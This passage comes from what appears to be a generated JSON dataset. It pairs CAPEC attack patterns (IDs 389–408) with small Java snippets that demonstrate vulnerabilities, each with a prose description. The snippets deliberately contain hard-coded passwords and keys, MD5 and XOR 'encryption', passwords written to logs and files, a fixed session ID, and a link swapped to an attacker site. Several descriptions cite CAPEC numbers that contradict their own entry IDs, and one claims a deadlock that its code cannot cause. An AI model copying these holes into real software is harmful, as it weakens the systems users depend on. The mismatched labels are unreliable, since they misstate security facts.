        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class ButtonHijackingExample {\n    private static Map<String, String> buttonLinks = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Initial button setup\n        buttonLinks.put(\"submit\", \"https://trustedsite.com/submit\");\n        buttonLinks.put(\"cancel\", \"https://trustedsite.com/cancel\");\n\n        // Simulate an attacker modifying the button link\n        modifyButtonLink(\"submit\", \"https://attackersite.com/submit\");\n\n        // Display buttons to user\n        displayButtons();\n    }\n\n    private static void modifyButtonLink(String button, String newLink) {\n        // CWE-471: Modification of Assumed-Immutable Data (MAID)\n        buttonLinks.put(button, newLink);\n    }\n\n    private static void displayButtons() {\n        for (Map.Entry<String, String> entry : buttonLinks.entrySet()) {\n            System.out.println(\"Button: \" + entry.getKey() + \" -> Link: \" + entry.getValue());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple example of Application API Button Hijacking. The `buttonLinks` map holds the URLs for buttons in an application. Initially, these buttons point to trusted URLs. However, the `modifyButtonLink` method simulates an attacker changing the URL of the 'submit' button to an attacker-controlled destination. This represents CWE-471 (Modification of Assumed-Immutable Data). The `displayButtons` method then prints out the buttons and their links, showing how the 'submit' button now points to a malicious URL. This example highlights the vulnerability where an attacker can manipulate button destinations, leading to potential security risks."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStreamWriter;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class ContentSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/api/data\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"POST\");\n            conn.setDoOutput(true);\n\n            // CWE-602: Client-Side Enforcement of Server-Side Security\n            String payload = \"{\\\"user\\\":\\\"admin\\\", \\\"auth\\\":\\\"false\\\"}\";\n            OutputStreamWriter writer = new OutputStreamWriter(conn.getOutputStream());\n            writer.write(payload);\n            writer.flush();\n            writer.close();\n\n            // Read response\n            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));\n            String line;\n            StringBuilder response = new StringBuilder();\n            while ((line = reader.readLine()) != null) {\n                response.append(line);\n            }\n            reader.close();\n\n            // CWE-353: Missing Support for Integrity Check\n            System.out.println(\"Response: \" + response.toString());\n\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of content spoofing via application API manipulation. The code sends a POST request to a hypothetical API endpoint with a payload that includes a spoofed user and authentication status. The payload is crafted to bypass server-side security by relying on client-side enforcement (CWE-602). Additionally, the response from the server is printed without any integrity checks (CWE-353), making it susceptible to manipulation. This example embodies the main idea of CAPEC-94 by showing how an attacker can manipulate API requests and responses to spoof content and potentially stage further attacks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class PhysicalSecurityBypass {\n    private static final Logger logger = Logger.getLogger(PhysicalSecurityBypass.class.getName());\n    private static final String LOCK_FILE = \"/path/to/lockfile\";\n    private static final String ALERT_FILE = \"/path/to/alertfile\";\n\n    public static void main(String[] args) {\n        try {\n            // Bypass physical lock by deleting lock file\n            Files.deleteIfExists(Paths.get(LOCK_FILE));\n            logger.log(Level.INFO, \"Lock file deleted, physical lock bypassed.\");\n\n            // Disable alert by deleting alert file\n            Files.deleteIfExists(Paths.get(ALERT_FILE));\n            logger.log(Level.INFO, \"Alert file deleted, alert system disabled.\");\n        } catch (IOException e) {\n            logger.log(Level.SEVERE, \"An error occurred while bypassing physical security.\", e);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of bypassing physical security mechanisms by deleting critical files that represent physical locks and alert systems. The code attempts to delete a lock file and an alert file, simulating the bypassing of physical security and disabling of alert mechanisms. This embodies the CAPEC concept of 'Bypassing Physical Security' by showing how an attacker might evade physical security measures and disable alert systems. The related CWEs are represented by the lack of proper protection against physical access (CWE-1263), improper handling of alert signals (CWE-1320), and the general idea of insufficient physical security measures."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "public class PhysicalLockBypass {\n    private boolean lockBit = true; // Represents a lock bit that should protect access\n    private boolean debugMode = false; // Represents a debug mode that can override locks\n\n    public void accessProtectedResource() {\n        if (debugMode) {\n            System.out.println(\"Access granted via debug mode override.\");\n        } else if (!lockBit) {\n            System.out.println(\"Access granted via lock bit modification.\");\n        } else {\n            System.out.println(\"Access denied. Lock is active.\");\n        }\n    }\n\n    public void setDebugMode(boolean mode) {\n        this.debugMode = mode;\n    }\n\n    public void modifyLockBit(boolean newLockBit) {\n        this.lockBit = newLockBit;\n    }\n\n    public static void main(String[] args) {\n        PhysicalLockBypass lockBypass = new PhysicalLockBypass();\n\n        // Attempt to access resource with lock active\n        lockBypass.accessProtectedResource(); // Output: Access denied. Lock is active.\n\n        // Bypass lock by modifying lock bit\n        lockBypass.modifyLockBit(false);\n        lockBypass.accessProtectedResource(); // Output: Access granted via lock bit modification.\n\n        // Bypass lock using debug mode\n        lockBypass.setDebugMode(true);\n        lockBypass.accessProtectedResource(); // Output: Access granted via debug mode override.\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where physical security measures (represented by a lock bit) can be bypassed. The `PhysicalLockBypass` class contains a `lockBit` that should protect access to a resource and a `debugMode` that can override the lock. The `accessProtectedResource` method checks if the lock is active or if it has been bypassed either by modifying the lock bit or by enabling debug mode. The `modifyLockBit` method allows changing the state of the lock bit, and the `setDebugMode` method enables or disables debug mode. The `main` method demonstrates how access can be denied when the lock is active, granted by modifying the lock bit, and granted by enabling debug mode. This code embodies the main idea of CAPEC-559 (Bypassing Physical Locks) and highlights related weaknesses such as improper physical access control (CWE-1263), improper prevention of lock bit modification (CWE-1231), and hardware internal or debug modes allowing override of locks (CWE-1234)."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "public class LockBumpingExample {\n    private static final int LOCK_BIT = 0x1; // Hard-coded lock bit\n    private static boolean lockBitSet = false;\n    private static boolean powerStateTransition = false;\n\n    public static void main(String[] args) {\n        // Simulate setting the lock bit during boot\n        setLockBit();\n\n        // Simulate a power state transition\n        powerStateTransition = true;\n\n        // Attempt to modify the lock bit after power state transition\n        if (powerStateTransition) {\n            modifyLockBit();\n        }\n\n        // Check if lock bit is still set\n        if (lockBitSet) {\n            System.out.println(\"Lock bit is set. System is secure.\");\n        } else {\n            System.out.println(\"Lock bit is not set. System is vulnerable.\");\n        }\n    }\n\n    private static void setLockBit() {\n        lockBitSet = true;\n        System.out.println(\"Lock bit set during boot.\");\n    }\n\n    private static void modifyLockBit() {\n        // Vulnerability: lock bit can be modified after power state transition\n        lockBitSet = false;\n        System.out.println(\"Lock bit modified after power state transition.\");\n    }\n}",
        "description": "This Java code snippet simulates a scenario where a lock bit is set during the boot process to secure the system configuration. However, due to a power state transition (e.g., entering and waking from low power sleep modes), the lock bit can be modified, representing a vulnerability. This embodies the main idea of the CAPEC 'Lock Bumping' by showing how a security mechanism (lock bit) can be bypassed (modified) after a specific event (power state transition). The code also incorporates related CWEs such as the use of a hard-coded lock bit (CWE-321) and improper lock behavior after power state transition (CWE-1232)."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "import java.util.concurrent.locks.ReentrantLock;\n\npublic class LockPickingExample {\n    private static final ReentrantLock lock = new ReentrantLock();\n    private static boolean lockBit = false;\n\n    public static void main(String[] args) {\n        // Simulate improper prevention of lock bit modification (CWE-1231)\n        lockBit = true; // Lock bit is set\n        System.out.println(\"Lock bit set: \" + lockBit);\n\n        // Simulate unrestricted externally accessible lock (CWE-412)\n        if (lockBit) {\n            lockBit = false; // External actor modifies the lock bit\n            System.out.println(\"Lock bit modified externally: \" + lockBit);\n        }\n\n        // Simulate unlocking a resource that is not locked (CWE-832)\n        if (!lock.isLocked()) {\n            try {\n                lock.unlock(); // Attempt to unlock an already unlocked lock\n            } catch (IllegalMonitorStateException e) {\n                System.out.println(\"Attempted to unlock a resource that is not locked.\");\n            }\n        }\n\n        // Simulate deadlock (CWE-833)\n        Thread t1 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 1 acquired the lock.\");\n                Thread.sleep(1000); // Simulate some work\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            } finally {\n                lock.unlock();\n                System.out.println(\"Thread 1 released the lock.\");\n            }\n        });\n\n        Thread t2 = new Thread(() -> {\n            lock.lock();\n            try {\n                System.out.println(\"Thread 2 acquired the lock.\");\n            } finally {\n                lock.unlock();\n                System.out.println(\"Thread 2 released the lock.\");\n            }\n        });\n\n        t1.start();\n        t2.start();\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to lock handling, inspired by the CAPEC 'Lock Picking' and associated CWEs. The code includes:\n\n1. **Improper Prevention of Lock Bit Modification (CWE-1231)**: The lock bit is set and then modified externally, simulating an attack where the lock bit is not properly protected.\n2. **Unrestricted Externally Accessible Lock (CWE-412)**: The lock bit is modified by an external actor, showing how an external influence can bypass the lock.\n3. **Unlock of a Resource that is not Locked (CWE-832)**: An attempt is made to unlock a resource that is not locked, demonstrating improper lock state management.\n4. **Deadlock (CWE-833)**: Two threads attempt to acquire the same lock, potentially leading to a deadlock situation if not managed correctly.\n\nThe code aims to illustrate how improper handling of locks and lock bits can lead to security vulnerabilities, similar to how physical lock picking exploits weaknesses in lock mechanisms."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "public class LockMechanism {\n    private boolean lockBit = false; // CWE-1231\n    private boolean powerState = true; // true for active, false for sleep\n    private int[] protectedRegisters = new int[10]; // CWE-1222\n    private final int DEFAULT_KEY = 12345; // CWE-1394\n    private int currentKey = DEFAULT_KEY;\n\n    public synchronized void setLockBit() {\n        if (!lockBit) {\n            lockBit = true;\n        }\n    }\n\n    public synchronized void modifyRegister(int index, int value) {\n        if (!lockBit) {\n            protectedRegisters[index] = value;\n        } else {\n            System.out.println(\"Modification not allowed, lock bit is set.\");\n        }\n    }\n\n    public synchronized void transitionPowerState(boolean newState) {\n        powerState = newState;\n        if (!powerState) {\n            lockBit = false; // CWE-1232\n        }\n    }\n\n    public synchronized void useDefaultKey() {\n        currentKey = DEFAULT_KEY; // CWE-1394\n    }\n\n    public static void main(String[] args) {\n        LockMechanism lock = new LockMechanism();\n        lock.setLockBit();\n        lock.modifyRegister(0, 42); // Should print modification not allowed\n        lock.transitionPowerState(false); // Transition to sleep mode\n        lock.modifyRegister(0, 42); // Should allow modification\n    }\n}",
        "description": "This Java code snippet represents a simplified lock mechanism that embodies the main idea of the CAPEC 'Using a Snap Gun Lock to Force a Lock' by simulating a lock bit that can be set to prevent modifications. The code includes vulnerabilities related to the CWEs provided: CWE-1231 (Improper Prevention of Lock Bit Modification), CWE-1222 (Insufficient Granularity of Address Regions Protected by Register Locks), CWE-1232 (Improper Lock Behavior After Power State Transition), and CWE-1394 (Use of Default Cryptographic Key). The lock bit can be set to prevent register modifications, but transitioning to a low power state resets the lock bit, allowing modifications again. The use of a default cryptographic key is also demonstrated."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "import java.util.Arrays;\n\npublic class AccessControl {\n    // CWE-321: Use of Hard-coded Cryptographic Key\n    private static final byte[] HARD_CODED_KEY = {0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF};\n\n    public static void main(String[] args) {\n        byte[] cardData = {0x10, 0x20, 0x30, 0x40, 0x50, 0x60, 0x70, 0x80};\n        if (authenticate(cardData)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n    private static boolean authenticate(byte[] cardData) {\n        byte[] encryptedData = simpleEncrypt(cardData, HARD_CODED_KEY);\n        byte[] expectedData = {0x5A, 0x6B, 0x7C, 0x8D, 0x9E, 0xAF, 0xB0, 0xC1};\n        return Arrays.equals(encryptedData, expectedData);\n    }\n\n    private static byte[] simpleEncrypt(byte[] data, byte[] key) {\n        byte[] encrypted = new byte[data.length];\n        for (int i = 0; i < data.length; i++) {\n            encrypted[i] = (byte) (data[i] ^ key[i % key.length]);\n        }\n        return encrypted;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified electronic access control system that uses a hard-coded cryptographic key (CWE-321) and a broken or risky cryptographic algorithm (CWE-327). The `authenticate` method checks if the encrypted card data matches the expected data using a simple XOR-based encryption, which is insecure. This represents the main idea of CAPEC-115: Bypassing Electronic Locks and Access Controls, by showing how an attacker could exploit weak cryptographic practices to gain unauthorized access."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "import java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class CardAuthentication {\n    private static final String SECRET_KEY = \"secret\";\n\n    public static void main(String[] args) throws NoSuchAlgorithmException {\n        String cardData = \"1234567890\"; // Simulated card data\n        String hashedData = hashCardData(cardData);\n        System.out.println(\"Hashed Card Data: \" + hashedData);\n\n        // Simulate an authentication check\n        if (authenticateCard(cardData)) {\n            System.out.println(\"Authentication Successful\");\n        } else {\n            System.out.println(\"Authentication Failed\");\n        }\n    }\n\n    private static String hashCardData(String data) throws NoSuchAlgorithmException {\n        MessageDigest md = MessageDigest.getInstance(\"MD5\"); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n        md.update((data + SECRET_KEY).getBytes());\n        byte[] digest = md.digest();\n        return Base64.getEncoder().encodeToString(digest);\n    }\n\n    private static boolean authenticateCard(String cardData) throws NoSuchAlgorithmException {\n        String expectedHash = hashCardData(cardData);\n        String providedHash = hashCardData(cardData); // Simulating replay attack (CWE-294)\n        return expectedHash.equals(providedHash); // CWE-290: Authentication Bypass by Spoofing\n    }\n}",
        "description": "This Java code snippet simulates a card authentication system that uses a broken cryptographic algorithm (MD5) to hash card data, representing CWE-327. The `hashCardData` method combines the card data with a secret key and hashes it using MD5. The `authenticateCard` method simulates an authentication check by comparing the expected hash with a provided hash, which is the same as the expected hash, representing a replay attack (CWE-294) and authentication bypass by spoofing (CWE-290). This demonstrates the vulnerabilities associated with using weak cryptographic algorithms and improper authentication mechanisms."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "import java.util.Arrays;\n\npublic class MagStripeCard implements Cloneable {\n    private byte[] cardData;\n\n    public MagStripeCard(byte[] data) {\n        this.cardData = Arrays.copyOf(data, data.length);\n    }\n\n    public byte[] getCardData() {\n        return cardData;\n    }\n\n    @Override\n    protected Object clone() throws CloneNotSupportedException {\n        return super.clone();\n    }\n\n    public static void main(String[] args) {\n        byte[] originalData = {0x12, 0x34, 0x56, 0x78};\n        MagStripeCard originalCard = new MagStripeCard(originalData);\n\n        try {\n            MagStripeCard clonedCard = (MagStripeCard) originalCard.clone();\n            System.out.println(\"Original Card Data: \" + Arrays.toString(originalCard.getCardData()));\n            System.out.println(\"Cloned Card Data: \" + Arrays.toString(clonedCard.getCardData()));\n        } catch (CloneNotSupportedException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the vulnerability of cloning magnetic stripe card data. The `MagStripeCard` class contains sensitive card data and implements the `Cloneable` interface, allowing the card data to be duplicated easily. The `main` method creates an instance of `MagStripeCard` with some dummy data and then clones it, showing that the cloned card contains the same data as the original. This represents the CAPEC idea of duplicating magstripe card data to gain unauthorized access. The related CWE-498 (Cloneable Class Containing Sensitive Information) is directly illustrated by making the class cloneable, which allows the sensitive card data to be copied without any protection."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "import java.util.Random;\n\npublic class MagneticStripCardBruteForce {\n    private static final String HARD_CODED_KEY = \"1234567890ABCDEF\"; // CWE-321\n    private static final int MAX_ATTEMPTS = 1000; // CWE-307\n\n    public static void main(String[] args) {\n        String cardData = \"1234567890123456\"; // Example card data\n        for (int i = 0; i < MAX_ATTEMPTS; i++) {\n            String generatedCard = generateCardData();\n            if (authenticate(generatedCard)) { // CWE-290\n                System.out.println(\"Access Granted with card: \" + generatedCard);\n                break;\n            }\n        }\n    }\n\n    private static String generateCardData() {\n        Random random = new Random();\n        StringBuilder cardData = new StringBuilder();\n        for (int i = 0; i < 16; i++) {\n            cardData.append(random.nextInt(10));\n        }\n        return cardData.toString();\n    }\n\n    private static boolean authenticate(String cardData) {\n        // Simulate a broken cryptographic check (CWE-327)\n        return cardData.equals(HARD_CODED_KEY);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a Magnetic Strip Card Brute Force Attack. The code attempts to generate valid card data by brute-forcing through multiple attempts (CWE-307). It uses a hard-coded cryptographic key (CWE-321) for authentication, which is a significant security flaw. The `authenticate` method simulates a broken cryptographic check (CWE-327) by comparing the generated card data with the hard-coded key. If a match is found, access is granted, representing an authentication bypass by spoofing (CWE-290). This code highlights the vulnerabilities associated with improper authentication mechanisms and the use of insecure cryptographic practices."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class RFIDCloning {\n    private static Map<String, String> rfidDatabase = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate adding RFID tags to the database\n        rfidDatabase.put(\"123456\", \"EmployeeA\");\n        rfidDatabase.put(\"654321\", \"EmployeeB\");\n\n        // Simulate cloning an RFID tag\n        String clonedRFID = cloneRFID(\"123456\");\n        System.out.println(\"Cloned RFID: \" + clonedRFID);\n\n        // Simulate access attempt with cloned RFID\n        if (authenticate(clonedRFID)) {\n            System.out.println(\"Access Granted\");\n        } else {\n            System.out.println(\"Access Denied\");\n        }\n    }\n\n    private static String cloneRFID(String originalRFID) {\n        // Insecure cloning mechanism\n        return originalRFID;\n    }\n\n    private static boolean authenticate(String rfid) {\n        // Insecure authentication mechanism\n        return rfidDatabase.containsKey(rfid);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified scenario of RFID card cloning and authentication. The `rfidDatabase` simulates a database of RFID tags associated with employees. The `cloneRFID` method represents an insecure cloning mechanism that simply returns the original RFID, illustrating the vulnerability of RFID systems to cloning attacks. The `authenticate` method checks if the cloned RFID exists in the database, representing an insecure authentication mechanism. This code embodies the main idea of CAPEC-170 (Cloning RFID Cards or Chips) and highlights related weaknesses such as CWE-1294 (Insecure Security Identifier Mechanism) and CWE-694 (Use of Multiple Resources with Duplicate Identifier)."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "public class RFIDChip {\n    private boolean isActive = true;\n    private boolean debugMode = false;\n    private String sensitiveData = \"SecretKey123\";\n\n    // Improper access control to debug interface (CWE-1191)\n    public void enableDebugMode() {\n        debugMode = true;\n    }\n\n    // Unauthorized error injection (CWE-1334)\n    public void injectError() {\n        if (debugMode) {\n            isActive = false; // Deactivates the RFID chip\n        }\n    }\n\n    // Improper scrubbing of sensitive data (CWE-1266)\n    public void decommission() {\n        isActive = false;\n        // Sensitive data is not properly scrubbed\n    }\n\n    public boolean isActive() {\n        return isActive;\n    }\n\n    public static void main(String[] args) {\n        RFIDChip chip = new RFIDChip();\n        chip.enableDebugMode(); // Improper access control\n        chip.injectError(); // Unauthorized error injection\n        System.out.println(\"RFID Chip Active: \" + chip.isActive()); // Should print false\n        chip.decommission(); // Improper scrubbing\n    }\n}",
        "description": "This Java code snippet represents the concept of 'RFID Chip Deactivation or Destruction' (CAPEC) by demonstrating vulnerabilities related to the associated CWEs. The RFIDChip class has methods that embody the following vulnerabilities:\n\n1. **Improper access control to debug interface (CWE-1191)**: The `enableDebugMode` method allows enabling debug mode without proper access control, making it possible for unauthorized users to access internal registers and test modes.\n\n2. **Unauthorized error injection (CWE-1334)**: The `injectError` method deactivates the RFID chip if the debug mode is enabled, simulating an attack where an unauthorized agent injects errors to disable the chip.\n\n3. **Improper scrubbing of sensitive data (CWE-1266)**: The `decommission` method deactivates the chip but does not properly scrub sensitive data, leaving it vulnerable to unauthorized access.\n\nThe main idea is to show how an attacker can deactivate or destroy an RFID chip by exploiting these vulnerabilities, rendering the chip unresponsive without damaging the object housing it."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class HardwareAccess {\n    private boolean isAuthenticated = false;\n\n    public void authenticate(String password) {\n        // Improper Physical Access Control (CWE-1263)\n        if (password.equals(\"admin\")) {\n            isAuthenticated = true;\n        }\n    }\n\n    public void writeToHardware(String data) throws IOException {\n        if (isAuthenticated) {\n            // Improper Restriction of Software Interfaces to Hardware Features (CWE-1256)\n            File hardwareFile = new File(\"/dev/hardware\");\n            FileWriter writer = new FileWriter(hardwareFile);\n            writer.write(data);\n            writer.close();\n        }\n    }\n\n    public static void main(String[] args) throws IOException {\n        HardwareAccess ha = new HardwareAccess();\n        ha.authenticate(\"admin\");\n        ha.writeToHardware(\"malicious data\");\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary can exploit improper physical access control (CWE-1263) and improper restriction of software interfaces to hardware features (CWE-1256). The `authenticate` method uses a hardcoded password to grant access, representing weak physical access control. Once authenticated, the `writeToHardware` method allows writing data directly to a hardware file, simulating the ability to modify hardware memory or register bits. This code embodies the main idea of the CAPEC by showing how an adversary could gain unauthorized access to hardware and make changes that undermine the system's integrity."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import java.util.Scanner;\n\npublic class ATAPasswordBypass {\n    private static final String HARD_CODED_PASSWORD = \"defaultPassword\";\n    private static boolean isAuthenticated = false;\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter ATA password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputPassword)) {\n            isAuthenticated = true;\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n\n        // Simulate hot swapping by bypassing authentication\n        if (!isAuthenticated) {\n            System.out.println(\"Bypassing authentication...\");\n            resetPassword();\n            System.out.println(\"Password reset. Access granted.\");\n        }\n    }\n\n    private static boolean authenticate(String password) {\n        return HARD_CODED_PASSWORD.equals(password);\n    }\n\n    private static void resetPassword() {\n        // Simulate resetting the password without proper authorization\n        isAuthenticated = true;\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of the 'Bypassing ATA Password Security' vulnerability. The code includes a hard-coded password (CWE-259) and simulates an ATA password authentication mechanism. If the user fails to authenticate, the code simulates a 'hot swap' scenario where the password is reset without proper authorization (CWE-285). This bypasses the authentication check and grants access, illustrating the vulnerability described in the CAPEC. The code highlights the risks associated with improper authorization checks and the use of hard-coded credentials."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        storeSensitiveData(sensitiveData);\n    }\n\n    public static void storeSensitiveData(String data) {\n        try {\n            File file = new File(\"sensitiveData.txt\");\n            FileWriter writer = new FileWriter(file);\n            writer.write(data);\n            writer.close();\n            logger.info(\"Sensitive data stored successfully.\");\n        } catch (IOException e) {\n            logger.severe(\"Failed to store sensitive data.\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable approach to storing sensitive data, embodying the deprecated CAPEC-118 and related CWEs. The code writes sensitive information (a password) directly to a file without any encryption or protection, which is a common issue highlighted by CWE-217 (Failure to Protect Stored Data from Modification) and CWE-218 (Failure to provide confidentiality for stored data). Additionally, the use of logging to indicate the storage of sensitive data can lead to information exposure through server log files, as described in CWE-533. This example illustrates the importance of securely handling and storing sensitive information to prevent unauthorized access and data breaches."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Logger;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        logSensitiveData(sensitiveData);\n        storeSensitiveData(sensitiveData);\n    }\n\n    private static void logSensitiveData(String data) {\n        // CWE-532: Information Exposure Through Log Files\n        logger.info(\"Sensitive Data: \" + data);\n    }\n\n    private static void storeSensitiveData(String data) {\n        // CWE-767: Improper Protection of Stored Data\n        File file = new File(\"sensitiveData.txt\");\n        try (FileWriter writer = new FileWriter(file)) {\n            writer.write(data);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to deprecated CAPEC and CWE entries. The main idea is to show how sensitive information can be improperly handled, leading to potential security risks. The `logSensitiveData` method logs sensitive data, which is a vulnerability described by CWE-532 (Information Exposure Through Log Files). The `storeSensitiveData` method writes sensitive data to a file without proper protection, illustrating CWE-767 (Improper Protection of Stored Data). These actions represent poor security practices that could be exploited by attackers to gather sensitive information."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\n\npublic class SensitiveDataHandler {\n    public static void main(String[] args) {\n        // CWE-316: Cleartext Storage of Sensitive Information in Memory\n        String sensitiveData = \"User: admin, Password: admin123\";\n\n        // CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\n        try {\n            File coreDump = new File(\"/tmp/core_dump.txt\");\n            FileWriter writer = new FileWriter(coreDump);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n\n        // CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\n        // Simulating decommissioning without proper scrubbing\n        File decommissionedDevice = new File(\"/tmp/decommissioned_device.txt\");\n        try {\n            FileWriter writer = new FileWriter(decommissionedDevice);\n            writer.write(sensitiveData);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving'. The code stores sensitive information in cleartext in memory (CWE-316) and writes it to a core dump file (CWE-528) and a decommissioned device file (CWE-1266) without proper scrubbing. This represents the main idea of dumpster diving, where an adversary could search through discarded files and devices to find sensitive information."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import java.util.HashMap;\nimport java.util.Map;\n\npublic class PretextingExample {\n    private static Map<String, String> userSessions = new HashMap<>();\n    private static Map<String, String> userData = new HashMap<>();\n\n    public static void main(String[] args) {\n        // Simulate user login\n        String sessionId = loginUser(\"user1\", \"password123\");\n        System.out.println(\"User logged in with session ID: \" + sessionId);\n\n        // Adversary pretexting as a system admin\n        String adversarySessionId = \"fixedSessionId\";\n        userSessions.put(\"admin\", adversarySessionId);\n        System.out.println(\"Adversary logged in with session ID: \" + adversarySessionId);\n\n        // Adversary accessing sensitive information\n        String sensitiveInfo = getSensitiveInfo(adversarySessionId);\n        System.out.println(\"Adversary accessed sensitive information: \" + sensitiveInfo);\n    }\n\n    private static String loginUser(String username, String password) {\n        // Insecure session fixation vulnerability\n        String sessionId = \"fixedSessionId\";\n        userSessions.put(username, sessionId);\n        userData.put(username, \"Sensitive Information of \" + username);\n        return sessionId;\n    }\n\n    private static String getSensitiveInfo(String sessionId) {\n        for (Map.Entry<String, String> entry : userSessions.entrySet()) {\n            if (entry.getValue().equals(sessionId)) {\n                return userData.get(entry.getKey());\n            }\n        }\n        return null;\n    }\n}",
        "description": "This Java code snippet demonstrates a pretexting attack scenario where an adversary manipulates a session fixation vulnerability to gain unauthorized access to sensitive information. The `loginUser` method simulates a user login process but uses a fixed session ID, which is a critical security flaw (CWE-384). The adversary pretexts as a system admin and uses the fixed session ID to access sensitive information (CWE-200). This example also highlights the lack of proper identity verification (CWE-300) and the potential for user interface misrepresentation (CWE-451) in a real-world application."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import java.io.FileWriter;\nimport java.io.IOException;\nimport java.util.logging.Level;\nimport java.util.logging.Logger;\n\npublic class VulnerableLogging {\n    private static final Logger logger = Logger.getLogger(VulnerableLogging.class.getName());\n\n    public static void main(String[] args) {\n        String sensitiveData = \"UserPassword123\";\n        try {\n            // Simulate some processing\n            processSensitiveData(sensitiveData);\n        } catch (Exception e) {\n            logger.log(Level.SEVERE, \"An error occurred: {0}\", e.getMessage());\n        }\n    }\n\n    private static void processSensitiveData(String data) throws IOException {\n        // Simulate writing sensitive data to a log file\n        try (FileWriter fw = new FileWriter(\"server.log\", true)) {\n            fw.write(\"Processing data: \" + data + \"\\n\");\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerability related to information exposure through server log files (CWE-532). The code processes sensitive data (a user password) and writes it to a log file without proper protection, exposing the sensitive information. This embodies the deprecated CAPEC pattern of information gathering from traditional sources, as an attacker could potentially access the log files to gather sensitive information. The code also logs errors without sanitizing the error messages, which could further expose sensitive data."
    },
    {
        "capec_id": "409",
